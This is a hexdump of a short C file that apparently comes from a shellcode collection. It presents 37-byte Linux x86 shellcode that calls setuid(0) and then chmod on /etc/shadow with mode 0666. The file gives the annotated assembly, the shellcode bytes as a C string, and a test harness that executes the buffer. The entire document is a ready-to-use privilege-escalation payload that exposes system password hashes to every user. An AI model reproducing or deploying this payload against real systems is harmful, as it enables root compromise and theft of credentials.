00000000  2f 2a 20 0a 20 2a 20 54  69 74 6c 65 3a 20 6c 69  |/* . * Title: li|
00000010  6e 75 78 2f 78 38 36 20  73 65 74 75 69 64 28 30  |nux/x86 setuid(0|
00000020  29 20 2b 20 63 68 6d 6f  64 28 22 2f 65 74 63 2f  |) + chmod("/etc/|
00000030  73 68 61 64 6f 77 22 2c  20 30 36 36 36 29 20 53  |shadow", 0666) S|
00000040  68 65 6c 6c 63 6f 64 65  20 33 37 20 42 79 74 65  |hellcode 37 Byte|
00000050  73 0a 20 2a 20 54 79 70  65 3a 20 53 68 65 6c 6c  |s. * Type: Shell|
00000060  63 6f 64 65 0a 20 2a 20  41 75 74 68 6f 72 3a 20  |code. * Author: |
00000070  61 6e 74 72 68 61 63 6b  73 0a 20 2a 20 50 6c 61  |antrhacks. * Pla|
00000080  74 66 6f 72 6d 3a 20 4c  69 6e 75 78 20 58 38 36  |tform: Linux X86|
00000090  0a 2a 2f 0a 0a 2f 2a 20  41 53 53 65 6d 62 6c 79  |.*/../* ASSembly|
000000a0  0a 20 33 31 20 64 62 20  20 20 20 20 20 20 20 20  |. 31 db         |
000000b0  20 20 20 20 20 20 20 09  78 6f 72 20 20 20 20 25  |       .xor    %|
000000c0  65 62 78 2c 25 65 62 78  0a 20 62 30 20 31 37 20  |ebx,%ebx. b0 17 |
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000000e0  6d 6f 76 20 20 20 20 24  30 78 31 37 2c 25 61 6c  |mov    $0x17,%al|
000000f0  0a 20 63 64 20 38 30 20  20 20 20 20 20 20 20 20  |. cd 80         |
00000100  20 20 20 20 20 20 20 09  69 6e 74 20 20 20 20 24  |       .int    $|
00000110  30 78 38 30 0a 20 33 31  20 63 30 20 20 20 20 20  |0x80. 31 c0     |
00000120  20 20 20 20 20 20 20 20  20 20 20 09 78 6f 72 20  |           .xor |
00000130  20 20 20 25 65 61 78 2c  25 65 61 78 0a 20 35 30  |   %eax,%eax. 50|
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000150  20 20 20 09 70 75 73 68  20 20 20 25 65 61 78 0a  |   .push   %eax.|
00000160  20 36 38 20 36 31 20 36  34 20 36 66 20 37 37 20  | 68 61 64 6f 77 |
00000170  20 20 20 20 20 20 09 70  75 73 68 20 20 20 24 30  |      .push   $0|
00000180  78 37 37 36 66 36 34 36  31 0a 20 36 38 20 36 33  |x776f6461. 68 63|
00000190  20 32 66 20 37 33 20 36  38 20 20 20 20 20 20 20  | 2f 73 68       |
000001a0  09 70 75 73 68 20 20 20  24 30 78 36 38 37 33 32  |.push   $0x68732|
000001b0  66 36 33 0a 20 36 38 20  32 66 20 32 66 20 36 35  |f63. 68 2f 2f 65|
000001c0  20 37 34 20 20 20 20 20  20 20 09 70 75 73 68 20  | 74       .push |
000001d0  20 20 24 30 78 37 34 36  35 32 66 32 66 0a 20 38  |  $0x74652f2f. 8|
000001e0  39 20 65 33 20 20 20 20  20 20 20 20 20 20 20 20  |9 e3            |
000001f0  20 20 20 20 09 6d 6f 76  20 20 20 20 25 65 73 70  |    .mov    %esp|
00000200  2c 25 65 62 78 0a 20 36  36 20 62 39 20 62 36 20  |,%ebx. 66 b9 b6 |
00000210  30 31 20 20 20 20 20 20  20 20 20 20 09 6d 6f 76  |01          .mov|
00000220  20 20 20 20 24 30 78 31  62 36 2c 25 63 78 0a 20  |    $0x1b6,%cx. |
00000230  62 30 20 30 66 20 20 20  20 20 20 20 20 20 20 20  |b0 0f           |
00000240  20 20 20 20 20 09 6d 6f  76 20 20 20 20 24 30 78  |     .mov    $0x|
00000250  66 2c 25 61 6c 0a 20 63  64 20 38 30 20 20 20 20  |f,%al. cd 80    |
00000260  20 20 20 20 20 20 20 20  20 20 20 20 09 69 6e 74  |            .int|
00000270  20 20 20 20 24 30 78 38  30 0a 20 34 30 20 20 20  |    $0x80. 40   |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000290  09 69 6e 63 20 20 20 20  25 65 61 78 0a 20 63 64  |.inc    %eax. cd|
000002a0  20 38 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 80             |
000002b0  20 20 20 09 69 6e 74 20  20 20 20 24 30 78 38 30  |   .int    $0x80|
000002c0  0a 2a 2f 0a 0a 69 6e 74  20 6d 61 69 6e 28 29 7b  |.*/..int main(){|
000002d0  0a 20 63 68 61 72 20 73  68 65 6c 6c 5b 5d 20 3d  |. char shell[] =|
000002e0  20 22 5c 78 33 31 5c 78  64 62 5c 78 62 30 5c 78  | "\x31\xdb\xb0\x|
000002f0  31 37 5c 78 63 64 5c 78  38 30 5c 78 33 31 5c 78  |17\xcd\x80\x31\x|
00000300  63 30 5c 78 35 30 22 0a  22 5c 78 36 38 5c 78 36  |c0\x50"."\x68\x6|
00000310  31 5c 78 36 34 5c 78 36  66 5c 78 37 37 5c 78 36  |1\x64\x6f\x77\x6|
00000320  38 5c 78 36 33 5c 78 32  66 5c 78 37 33 5c 78 36  |8\x63\x2f\x73\x6|
00000330  38 22 0a 22 5c 78 36 38  5c 78 32 66 5c 78 32 66  |8"."\x68\x2f\x2f|
00000340  5c 78 36 35 5c 78 37 34  5c 78 38 39 5c 78 65 33  |\x65\x74\x89\xe3|
00000350  5c 78 36 36 5c 78 62 39  5c 78 62 36 5c 78 30 31  |\x66\xb9\xb6\x01|
00000360  22 0a 22 5c 78 62 30 5c  78 30 66 5c 78 63 64 5c  |"."\xb0\x0f\xcd\|
00000370  78 38 30 5c 78 34 30 5c  78 63 64 5c 78 38 30 22  |x80\x40\xcd\x80"|
00000380  3b 0a 0a 20 70 72 69 6e  74 66 28 22 5b 2a 5d 20  |;.. printf("[*] |
00000390  54 61 69 6c 6c 65 20 64  75 20 53 68 65 6c 6c 43  |Taille du ShellC|
000003a0  6f 64 65 20 3d 20 25 64  5c 6e 22 2c 20 73 74 72  |ode = %d\n", str|
000003b0  6c 65 6e 28 73 68 65 6c  6c 29 29 3b 0a 20 28 2a  |len(shell));. (*|
000003c0  28 76 6f 69 64 20 28 2a  29 28 29 29 20 73 68 65  |(void (*)()) she|
000003d0  6c 6c 29 28 29 3b 0a 20  0a 20 72 65 74 75 72 6e  |ll)();. . return|
000003e0  20 30 3b 0a 7d                                    | 0;.}|
000003e5
